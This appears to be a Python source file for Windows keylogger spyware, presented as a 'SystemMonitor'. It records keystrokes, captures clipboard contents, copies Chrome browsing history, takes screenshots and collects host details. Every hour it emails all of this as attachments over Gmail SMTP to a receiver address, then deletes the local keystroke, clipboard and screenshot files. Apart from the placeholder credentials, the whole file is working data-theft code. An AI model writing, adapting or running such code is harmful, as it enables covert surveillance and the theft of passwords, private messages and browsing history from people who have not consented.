""" This is a python program that does the following:
1->Record the keystrokes and store it in text file
    *******pynput.keyboard, key and listener
2->Retrieve the computer information and store it in excel file
    *******socket, platform and pandas
3->Retrieve the clipboard information and store it in text file
   ********win32clipboard
4->Retrieve the google chrome history and store it in excel file
   ********datetime, sqlite3 and pandas
5->Take a screenshot of the computer screen in png format
   ********pillow and imagegrab """

import pynput
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import time
import threading
import sqlite3
import datetime
import socket
import platform
import win32clipboard
from PIL import ImageGrab
import pandas as pd

class SystemMonitor:
    def __init__(self):
        # File paths
        self.keylog_file = "keystrokes.txt"
        self.error_log_file = "error_logs.txt"
        self.clipboard_file = "clipboard.txt"
        self.system_info_file = "system_info.xlsx"
        self.chrome_history_file = "chrome_history.xlsx"
        self.screenshot_file = "screenshot.png"
        
        # Email configuration
        self.sender_email = "your_email@example.com"
        self.sender_password = "your_password"
        self.receiver_email = "receiver@example.com"
        
        # Initialize data collection
        self.keyboard_listener = None
        self.email_thread = None

        # Ensure primary log files exist so users can see them immediately
        self._ensure_log_files()

    def _ensure_log_files(self):
        """Create empty log files if they don't exist yet."""
        for file_path in [self.keylog_file, self.error_log_file, self.clipboard_file]:
            try:
                with open(file_path, "a"):
                    pass
            except Exception:
                # Fallback: print to console because error_log may not be writable yet
                print(f"Unable to create or access {file_path}")

    def start_keylogging(self):
        """Start keyboard monitoring"""
        def on_press(key):
            try:
                current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                if hasattr(key, 'char'):
                    key_data = f"{current_time} - Key: {key.char}\n"
                else:
                    key_data = f"{current_time} - Special Key: {key}\n"
                
                with open(self.keylog_file, "a") as f:
                    f.write(key_data)
            except Exception as e:
                self.log_error(f"Keylogging error: {str(e)}")

        def on_release(key):
            if key == pynput.keyboard.Key.esc:
                return False

        self.keyboard_listener = pynput.keyboard.Listener(
            on_press=on_press,
            on_release=on_release
        )
        self.keyboard_listener.start()

    def collect_system_info(self):
        """Collect system information"""
        try:
            data = {
                'Metric': ['Date', 'IP Address', 'Processor', 'System', 'Release', 'Host Name'],
                'Value': [
                    datetime.date.today(),
                    socket.gethostbyname(socket.gethostname()),
                    platform.processor(),
                    platform.system(),
                    platform.release(),
                    socket.gethostname()
                ]
            }
            df = pd.DataFrame(data)
            df.to_excel(self.system_info_file, index=False)
        except Exception as e:
            self.log_error(f"System info collection error: {str(e)}")

    def collect_clipboard(self):
        """Collect clipboard data"""
        try:
            current_time = datetime.datetime.now()
            win32clipboard.OpenClipboard()
            try:
                pasted_data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                if isinstance(pasted_data, bytes):
                    pasted_data = pasted_data.decode('utf-8', errors='ignore')
            except:
                pasted_data = "[Non-text clipboard data]"
            win32clipboard.CloseClipboard()

            with open(self.clipboard_file, "a") as f:
                f.write(f"\nTime: {current_time}\n")
                f.write(f"Clipboard Data: {pasted_data}\n")
        except Exception as e:
            self.log_error(f"Clipboard collection error: {str(e)}")

    def collect_chrome_history(self):
        """Collect Chrome browsing history"""
        try:
            username = os.getlogin()
            history_path = f'C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History'
            
            conn = sqlite3.connect(history_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') 
                AS last_visit_time FROM urls
            """)
            
            history_data = cursor.fetchall()
            df = pd.DataFrame(history_data, columns=['url', 'title', 'Timestamp'])
            df.to_excel(self.chrome_history_file, index=False)
            
            conn.close()
        except Exception as e:
            self.log_error(f"Chrome history collection error: {str(e)}")

    def take_screenshot(self):
        """Capture screen"""
        try:
            im = ImageGrab.grab()
            im.save(self.screenshot_file)
        except Exception as e:
            self.log_error(f"Screenshot error: {str(e)}")

    def send_email(self):
        """Send collected data via email"""
        try:
            msg = MIMEMultipart()
            msg['From'] = self.sender_email
            msg['To'] = self.receiver_email
            msg['Subject'] = "System Monitor Report"

            # Attach all collected files
            files_to_attach = [
                self.keylog_file,
                self.error_log_file,
                self.clipboard_file,
                self.system_info_file,
                self.chrome_history_file,
                self.screenshot_file
            ]

            for file in files_to_attach:
                if os.path.exists(file):
                    with open(file, "rb") as attachment:
                        part = MIMEBase("application", "octet-stream")
                        part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header("Content-Disposition", f"attachment; filename= {file}")
                    msg.attach(part)

            # Send email
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.sender_email, self.sender_password)
            server.send_message(msg)
            server.quit()

            # Clean up files after sending
            self.cleanup_files()
        except Exception as e:
            self.log_error(f"Email sending error: {str(e)}")

    def log_error(self, error_message):
        """Log errors to error file"""
        with open(self.error_log_file, "a") as f:
            f.write(f"{datetime.datetime.now()} - {error_message}\n")

    def cleanup_files(self):
        """Clean up files after sending"""
        files_to_clean = [
            self.keylog_file,
            self.clipboard_file,
            self.screenshot_file
        ]
        for file in files_to_clean:
            if os.path.exists(file):
                os.remove(file)

    def start_monitoring(self):
        """Start all monitoring activities"""
        # Start keylogging
        self.start_keylogging()
        
        # Collect initial system info
        self.collect_system_info()
        
        # Start periodic tasks
        def periodic_tasks():
            while True:
                self.collect_clipboard()
                self.collect_chrome_history()
                self.take_screenshot()
                self.send_email()
                time.sleep(3600)  # Run every hour
        
        self.email_thread = threading.Thread(target=periodic_tasks)
        self.email_thread.daemon = True
        self.email_thread.start()

        # Keep the main thread alive so the listener can capture keystrokes.
        # Without this join the process would exit immediately after startup.
        try:
            self.keyboard_listener.join()
        except KeyboardInterrupt:
            pass

if __name__ == "__main__":
    monitor = SystemMonitor()
    monitor.start_monitoring()









  




